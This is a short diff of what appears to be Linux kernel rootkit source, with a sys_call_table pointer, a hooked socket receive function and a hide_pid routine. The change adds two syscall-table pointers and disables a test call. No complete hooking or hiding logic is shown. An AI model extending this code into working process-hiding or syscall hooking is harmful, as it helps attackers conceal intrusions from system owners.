@@ -76,6 +76,8 @@ struct pid_list_node *pid_list_find(pid_t nr);
  * Global variables.
  */
 void **sys_call_table;
+void *psct_fastcall;
+void *psct_slowpath;
 struct pid_list_node *pid_list_head;
 struct pid_list_node *pid_list_tail;
 int (*tr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags);
@@ -123,7 +125,7 @@ void pid_list_test(void) {
 
 void kernel_test(void) {
 	pinfo("hola!\n");
-	pid_list_test();
+//	pid_list_test();
 }
 
 int hide_pid(pid_t nr) {
